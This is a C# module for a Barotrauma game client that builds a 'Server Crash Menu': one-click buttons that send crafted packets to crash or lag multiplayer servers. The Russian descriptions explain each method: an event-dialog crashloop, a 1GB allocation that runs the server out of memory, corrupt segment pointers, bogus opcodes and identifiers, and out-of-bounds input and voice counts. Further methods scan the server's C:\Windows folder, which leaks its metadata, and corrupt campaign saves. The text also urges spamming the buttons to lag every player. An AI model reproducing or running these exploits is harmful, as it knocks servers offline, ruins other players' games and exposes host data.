using System;
using System.Collections.Generic;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    // ============================================================
    //  SERVER CRASH MENU v2 (волна 595)
    //  • EXEC-кнопка прямо в каждой строке (где метод автоматизирован)
    //  • Группы: УБИВАЮТ ПРОЦЕСС / DoS-ЛАГ / ОСОБЫЕ
    //  • Клик по названию = описание; клик по EXEC = запуск
    //
    //  Классы: [INSTANT] процесс умирает сразу • [CRASHLOOP] умирает
    //  циклом на след. тик • [DOS] батч-дроп (лаг/десинк, процесс жив)
    //  • [PERM] нужен перм • [SAVE] порча персистится в сейв
    //
    //  НОВОЕ в v2 (волна 595):
    //  • [DOS] EntityState гигантский msgLength → new byte[1ГБ] → OOM
    //  • [DOS] SegmentTable кривой указатель (4 байта)
    //  • [DOS] REQUEST_BACKUP_INDICES = спам сканом ФС сервера
    // ============================================================
    public class ServerCrashMenuModule : CSModuleBase
    {
        public override string Id   => "crash_menu";
        public override string Name => "Crash Menu";
        public override string Description =>
            "Все краши/DoS сервера из 595 волн.\n\n" +
            "• EXEC в строке = запуск (где автоматизирован)\n" +
            "• Клик по названию = описание и условия\n" +
            "• [INSTANT]/[CRASHLOOP] — смерть процесса\n" +
            "• [DOS] — лаг/десинк, процесс жив\n" +
            "• [SAVE] — порча остаётся после рестарта!\n" +
            "• Тестируй ТОЛЬКО на своём сервере!";

        public override string Category => "exploit";

        private static readonly Color InstColor  = new Color(255, 90, 90);
        private static readonly Color LoopColor  = new Color(255, 150, 60);
        private static readonly Color DosColor   = new Color(255, 220, 90);
        private static readonly Color PermColor  = new Color(170, 150, 255);
        private static readonly Color SaveColor  = new Color(120, 220, 255);
        private static readonly Color OkColor    = new Color(120, 255, 140);
        private static readonly Color DangerColor= new Color(255, 110, 110);
        private static readonly Color RowColor   = new Color(30, 36, 48);
        private static readonly Color SelColor   = new Color(90, 40, 40);
        private static readonly Color AccentColor= new Color(255, 170, 90);
        private static readonly Color HeadColor  = new Color(45, 55, 75);

        private static GUIMessageBox _window;
        private static GUIListBox _list;
        private static GUITextBlock _desc;

        private class Method
        {
            public string Title;
            public string Desc;
            public Func<string> Exec; // null = только справочник
        }

        private static readonly Method[] InstMethods = new Method[]
        {
            new Method
            {
                Title = "[INSTANT] DescriptionTag — смерть сразу",
                Desc =
"★ ПОДТВЕРЖДЕНО ТОБОЙ: сервер умирает МГНОВЕННО.\n\n" +
"КАК: 1) Открой Property Editor. 2) Любой доступный предмет.\n" +
"3) Свойство DescriptionTag → впиши любой текст → примени.\n\n" +
"МЕХАНИКА: сеттер зовёт TextManager.Get(текст) и сразу шлёт\n" +
"ChangeProperty всем клиентам — вылет за пределами catch-all.\n\n" +
"УСЛОВИЯ: предмет тебе доступен (свой/рядом).",
                Exec = null // делается через PropertyEditorModule
            },
            new Method
            {
                Title = "[CRASHLOOP] EventManager option=200",
                Desc =
"★ КОД-КРАШ (584). Смерть на СЛЕДУЮЩЕМ ТИКЕ после пакета.\n\n" +
"КАК: жми EXEC. НО работает ТОЛЬКО если активный событийный\n" +
"диалог (вопрос NPC с вариантами) СЕЙЧАС ТАРГЕТИТ ТЕБЯ.\n\n" +
"МЕХАНИКА: option=200 > числа опций → throw глотается, НО\n" +
"SelectedOption=200 остаётся → КАЖДЫЙ КАДР IsFinished/Update\n" +
"кидают IndexOutOfRange → вокруг игрового цикла catch НЕТ →\n" +
"процесс dedicated падает.\n\n" +
"СОЛО: заспавнь событие аутпоста у себя на сервере.",
                Exec = ExecEventManager
            }
        };

        private static readonly Method[] DosMethods = new Method[]
        {
            new Method
            {
                Title = "[DOS] SoldItems: несуществующий префаб",
                Desc =
"ЛУЧШИЙ безправный DoS (42): throw НА ВЕРХУ кампейн-чтения\n" +
"(строка 854) ДО всех перм/проверок.\n\n" +
"КАК: EXEC. Спам кнопкой = сервер лагает/десинк у всех.\n" +
"УСЛОВИЕ: кампания на сервере (любая роль).",
                Exec = ExecSoldPrefab
            },
            new Method
            {
                Title = "[DOS] EntityState: new byte[1ГБ] (OOM)",
                Desc =
"НОВОЕ (27+595). EntityState-событие с msgLength=~1ГБ.\n" +
"Сервер делает new byte[msgLength] ДО проверки буфера!\n\n" +
"КАК: EXEC — попытка аллокации 1ГБ из крошечного пакета.\n" +
"OOM/OutOfRange → батч-дроп + мусор в памяти. Спам = давление\n" +
"на GC: фризы у всех клиентов.\n\n" +
"УСЛОВИЕ: ты в раунде (нужен ID существующей entity — берём\n" +
"своего персонажа), ID события подбирается автоматически.",
                Exec = ExecEntityStateOom
            },
            new Method
            {
                Title = "[DOS] SegmentTable: битый указатель",
                Desc =
"НОВОЕ (27). UPDATE_LOBBY с tablePointer=0x7FFFFFFF:\n" +
"сервер прыгает на 2ГБ вперёд и читает мусор → throw.\n\n" +
"КАК: EXEC — 4 байта и пакет готов. Батч-дроп, спам = лаг.\n" +
"УСЛОВИЙ НЕТ (даже из лобби).",
                Exec = ExecSegmentTable
            },
            new Method
            {
                Title = "[DOS] CircuitBox: левый opcode",
                Desc =
"(26). Прямой CIRCUITBOX-пакет с Opcode=AddComponent —\n" +
"ваниль так не шлёт → switch бросит ArgumentOutOfRange.\n\n" +
"КАК: EXEC. УСЛОВИЙ НЕТ.",
                Exec = ExecCircuitBox
            },
            new Method
            {
                Title = "[DOS] Чат: несуществующий ордер",
                Desc =
"(30). ORDER-чат с неизвестным id ордера → throw на\n" +
"OrderPrefab.Prefabs[id] ДО спам/перм-чеков.\n\n" +
"КАК: EXEC. ★ РАБОТАЕТ ИЗ ЛОББИ. УСЛОВИЙ НЕТ.",
                Exec = ExecChatOrder
            },
            new Method
            {
                Title = "[DOS] CharacterInput: count=255",
                Desc =
"(35). Инпут-пакет: заявлено 255 инпутов, данных нет →\n" +
"OOB-чтение за краем пакета → батч-дроп.\n\n" +
"КАК: EXEC. УСЛОВИЕ: ты в раунде с персонажем.",
                Exec = ExecCharInput
            },
            new Method
            {
                Title = "[DOS] VOIP: пустые буферы",
                Desc =
"(28/451). Заявлено 8 буферов по 255 байт, данных 0 →\n" +
"BlockCopy за краем → батч-дроп. (451: 1 байт TOC →\n" +
"OpusException → дроп тика VOIP.)\n\n" +
"КАК: EXEC. УСЛОВИЕ: голос включён, ты не в муте.",
                Exec = ExecVoip
            },
            new Method
            {
                Title = "[DOS] Backup Indices: спам сканом ФС",
                Desc =
"(26). REQUEST_BACKUP_INDICES БЕЗ прав и лимитов:\n" +
"сервер сканирует ЛЮБУЮ папку по твоему пути и парсит\n" +
"найденные бэкапы (декомпрессия!).\n\n" +
"КАК: EXEC шлёт путь корня диска — сервер листает каталог.\n" +
"Спам = IO/CPU нагрузка + утечка метаданных тебе в ответ.\n" +
"УСЛОВИЙ НЕТ.",
                Exec = ExecBackupScan
            }
        };

        private static readonly Method[] SpecialMethods = new Method[]
        {
            new Method
            {
                Title = "[PERM-DOS] SelectMode: modeIndex OOB",
                Desc =
"(41). SERVER_COMMAND(SelectMode) + u16 9999 →\n" +
"GameModes[9999] → IndexOutOfRange.\n\n" +
"НУЖЕН РЕАЛЬНЫЙ ПЕРМ SelectMode (permless-сервер его НЕ даёт\n" +
"— AnyOneAllowed не трогает HasPermission). Кнопки нет:\n" +
"пакет = SERVER_COMMAND + u16 0x20 + u16 9999.",
                Exec = null
            },
            new Method
            {
                Title = "[DOS] Inventory: индексы OOB",
                Desc =
"(26). InventoryState-эвент контейнера: байты start/end без\n" +
"клампа → receivedItemIds[i] за границей → батч-дроп.\n\n" +
"Кнопки нет (нужен entity-event канал с подбором ID события —\n" +
"как у EntityState, но с кривым Inventory-телем). Ручками через\n" +
"PacketDump/фазер.",
                Exec = null
            },
            new Method
            {
                Title = "[SAVE] CircuitBox MoveComponent NaN",
                Desc =
"(523). MoveAmount = raw Vector2 персистится В СЕЙВ.\n" +
"NaN в позициях компонентов цепи → глюки/краши ЗАГРУЗКИ\n" +
"кампании после рестарта сервера.\n\n" +
"★ ОСТОРОЖНО: НЕОБРАТИМО портит сохранение. Только на\n" +
"своей тест-кампании! Путь: entity-событие CircuitBox\n" +
"(через PropertyEditor/CircuitBox UI на своём сервере).",
                Exec = null
            },
            new Method
            {
                Title = "[PERM] LoadCampaign: мусорный файл",
                Desc =
"(586). CAMPAIGN_SETUP_INFO isNew=false: путь сейва — строка\n" +
"клиента (за пермом ManageRound/окном). Скормить серверу мусорный\n" +
"файл = парс-исключения при загрузке кампании (возможен жёсткий\n" +
"фейл старта).\n\n" +
"НУЖНО ОКНО 586 (админ мёртв/лобби/permless). Кнопки нет.",
                Exec = null
            }
        };

        public override string GetLabel() => "Crash Menu 💥";

        public override void OnClick()
        {
            if (_window != null) { CloseWindow(); return; }
            BuildWindow();
        }

        private static void BuildWindow()
        {
            try
            {
                _window = new GUIMessageBox("Server Crash Menu v2", "", Array.Empty<LocalizedString>(), new Vector2(0.8f, 0.92f));
                var content = _window.Content;
                content.ClearChildren();

                _list = new GUIListBox(new RectTransform(new Vector2(1f, 0.47f), content.RectTransform));
                _list.Color = new Color(20, 25, 35);

                AddGroupHeader("☠ УБИВАЮТ ПРОЦЕСС СЕРВЕРА", InstColor);
                AddMethods(InstMethods);

                AddGroupHeader("⚠ DoS — ЛАГ / ДЕСИНК (процесс жив)", DosColor);
                AddMethods(DosMethods);

                AddGroupHeader("🔧 ОСОБЫЕ (перм / сейв / ручные)", PermColor);
                AddMethods(SpecialMethods);

                _desc = new GUITextBlock(
                    new RectTransform(new Vector2(1f, 0.43f), content.RectTransform, Anchor.BottomCenter)
                        { RelativeOffset = new Vector2(0f, 0.075f) },
                    "Клик по НАЗВАНИЮ = описание. Клик по EXEC = запуск.", textAlignment: Alignment.CenterLeft);
                _desc.TextColor = AccentColor;
                _desc.CanBeFocused = false;
                try { _desc.Wrap = true; } catch { }
            }
            catch (Exception e)
            {
                GUI.AddMessage("[CrashMenu] GUI fail: " + e.Message, DangerColor);
                CloseWindow();
            }
        }

        private static void AddGroupHeader(string text, Color color)
        {
            var row = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.07f), _list.Content.RectTransform), style: null);
            row.Color = HeadColor;
            var txt = new GUITextBlock(new RectTransform(Vector2.One, row.RectTransform), text,
                textAlignment: Alignment.CenterLeft);
            txt.TextColor = color;
            txt.CanBeFocused = false;
            AddSpacer();
        }

        private static void AddSpacer()
        {
            var gap = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.014f), _list.Content.RectTransform), style: null);
            gap.Color = new Color(15, 18, 26);
            gap.CanBeFocused = false;
        }

        private static void AddMethods(Method[] methods)
        {
            foreach (Method m in methods)
            {
                Method mm = m;
                var row = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.085f), _list.Content.RectTransform), style: null);
                row.Color = RowColor;
                var layout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.99f, 1f), row.RectTransform, Anchor.Center), isHorizontal: true);

                bool hasExec = mm.Exec != null;
                if (hasExec)
                {
                    var execBtn = new GUIButton(
                        new RectTransform(new Vector2(0.13f, 1f), layout.RectTransform), "EXEC ▶");
                    execBtn.Color = SelColor;
                    execBtn.OnClicked = (b, d) =>
                    {
                        ShowDesc(mm);
                        RunExec(mm);
                        return true;
                    };
                }
                else
                {
                    var noExec = new GUITextBlock(
                        new RectTransform(new Vector2(0.13f, 1f), layout.RectTransform), "—",
                        textAlignment: Alignment.Center);
                    noExec.TextColor = new Color(90, 100, 120);
                    noExec.CanBeFocused = false;
                }

                var nameBtn = new GUIButton(
                    new RectTransform(new Vector2(0.87f, 1f), layout.RectTransform),
                    hasExec ? mm.Title : mm.Title + "   (без кнопки)");
                nameBtn.OnClicked = (b, d) => { ShowDesc(mm); return true; };

                AddSpacer();
            }
        }

        private static void ShowDesc(Method m)
        {
            if (_desc == null) { return; }
            _desc.Text = m.Title + "\n──────────────────────────────\n" + m.Desc;
            _desc.TextColor = AccentColor;
        }

        private static void RunExec(Method m)
        {
            if (m.Exec == null) { return; }
            try
            {
                string result = m.Exec();
                GUI.AddMessage("[CrashMenu] " + result, OkColor);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[CrashMenu] " + m.Title + ": " + e.Message, DangerColor);
            }
        }

        // ========================================================
        //  ХЕЛПЕРЫ
        // ========================================================
        private static bool CanSend()
        {
            return GameMain.Client?.ClientPeer != null;
        }

        private static ushort CurrentLocIndex()
        {
            try
            {
                var map = GameMain.GameSession?.Campaign?.Map;
                if (map?.CurrentLocation != null)
                {
                    int idx = map.Locations.IndexOf(map.CurrentLocation);
                    if (idx >= 0) { return (ushort)idx; }
                }
            }
            catch { }
            return 0;
        }

        // ========================================================
        //  [CRASHLOOP] EVENTMANAGER option=200 (584)
        // ========================================================
        private static string ExecEventManager()
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.EVENTMANAGER_RESPONSE);
            msg.WriteUInt16(0x7FFF);   // actionId
            msg.WriteByte(200);        // option >> Options.Count
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "EVENTMANAGER отправлен. Сработает только при активном диалоге на тебя!";
        }

        // ========================================================
        //  [DOS] SoldItems unknown prefab (42)
        // ========================================================
        private static string ExecSoldPrefab()
        {
            if (!CanSend()) { return "нет подключения"; }
            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
            msg.WriteUInt16((ushort)ClientPermissions.ManageCampaign);
            ushort loc = CurrentLocIndex();
            msg.WriteUInt16(loc);
            msg.WriteUInt16(loc);
            msg.WriteByte(0);
            msg.WriteBoolean(false);
            msg.WriteBoolean(false);
            msg.WriteBoolean(false);
            msg.WriteByte(0);
            msg.WriteByte(0);
            msg.WriteByte(0);
            msg.WriteByte(1);                                            // 1 store
            msg.WriteIdentifier("a".ToIdentifier());
            msg.WriteUInt16(1);                                          // 1 item
            msg.WriteIdentifier("zzz_nonexistent_prefab".ToIdentifier());
            msg.WriteUInt16(0);
            msg.WriteBoolean(false);
            msg.WriteByte(0);
            msg.WriteByte(0);
            msg.WriteUInt16(0);
            msg.WriteUInt16(0);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "SoldItems-bomb ушла (throw на 854 строке, до всех проверок)";
        }

        // ========================================================
        //  [DOS] EntityState giant msgLength → OOM (27/595)
        // ========================================================
        private static string ExecEntityStateOom()
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!GameMain.Client.GameStarted || Character.Controlled == null)
            { return "нужно быть в раунде с персонажем"; }
            ushort myId = Character.Controlled.ID;

            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
            msg.WriteBoolean(true);
            msg.WritePadBits();
            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
            {
                segmentTable.StartNewSegment(ClientNetSegment.EntityState);
                msg.WritePadBits();
                msg.WriteUInt16(0);                    // firstEventID (подберётся ретраями)
                msg.WriteByte(1);                      // eventCount
                msg.WriteUInt16(myId);                 // entityID = мой персонаж (IClientSerializable)
                msg.WriteVariableUInt32(0x40000000u);  // msgLength = 1 ГБ!
                msg.WriteUInt16(0);                    // characterStateID
                // данных нет — сервер сделает new byte[1ГБ] ДО проверки буфера
            }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "OOM-бомба ушла (попытка new byte[1ГБ] на сервере). Спамить для давления на GC.";
        }

        // ========================================================
        //  [DOS] SegmentTable corrupt pointer (27/595)
        // ========================================================
        private static string ExecSegmentTable()
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
            msg.WriteInt32(int.MaxValue);              // tablePointer = 2ГБ вперёд
            msg.WriteUInt16(0);
            msg.WriteUInt16(0);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "SegmentTable-бомба ушла (чтение таблицы за пределами буфера)";
        }

        // ========================================================
        //  [DOS] CircuitBox bad opcode (26)
        // ========================================================
        private static string ExecCircuitBox()
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.CIRCUITBOX);
            INetSerializableStruct header = new NetCircuitBoxHeader((CircuitBoxOpcode)2, 1, 0);
            header.Write(msg);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "CircuitBox opcode-бомба ушла";
        }

        // ========================================================
        //  [DOS] Chat unknown order (30)
        // ========================================================
        private static string ExecChatOrder()
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
            {
                segmentTable.StartNewSegment(ClientNetSegment.ChatMessage);
                msg.WriteUInt16(1);
                msg.WriteRangedInteger((int)ChatMessageType.Order, 0, 12);
                msg.WriteRangedInteger((int)ChatMode.None, 0, 2);
                msg.WriteIdentifier("zzz_nonexistent_order".ToIdentifier());
                msg.WriteUInt16(0);
                msg.WriteUInt16(0);
                msg.WriteByte(0);
            }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "ORDER-бомба ушла (работает из лобби!)";
        }

        // ========================================================
        //  [DOS] CharacterInput count=255 (35)
        // ========================================================
        private static string ExecCharInput()
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!GameMain.Client.GameStarted || Character.Controlled == null)
            { return "нужно быть в раунде с персонажем"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
            msg.WriteBoolean(true);
            msg.WritePadBits();
            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
            {
                segmentTable.StartNewSegment(ClientNetSegment.CharacterInput);
                msg.WriteUInt16(1);
                msg.WriteByte(255);                    // 255 инпутов, данных нет
            }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "Input-бомба ушла";
        }

        // ========================================================
        //  [DOS] VOIP empty buffers (28/451)
        // ========================================================
        private static string ExecVoip()
        {
            if (!CanSend()) { return "нет подключения"; }
            byte mySession = 0;
            try { mySession = GameMain.Client.SessionId; } catch { }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.VOICE);
            msg.WriteByte(mySession);
            for (int i = 0; i < 8; i++) { msg.WriteByte(255); }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Unreliable);
            return "VOIP-бомба ушла";
        }

        // ========================================================
        //  [DOS] REQUEST_BACKUP_INDICES filesystem scan (26/595)
        // ========================================================
        private static string ExecBackupScan()
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.REQUEST_BACKUP_INDICES);
            msg.WriteString("C:\\Windows");           // сервер листает каталог
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "Скан ФС отправлен (сервер листает C:\\Windows). Спамить = IO-нагрузка. Ответ = метаданные тебе.";
        }

        private static void CloseWindow()
        {
            try { _window?.Close(); } catch { }
            _window = null;
            _list = null;
            _desc = null;
        }

        public override void Dispose()
        {
            CloseWindow();
            base.Dispose();
        }
    }
}
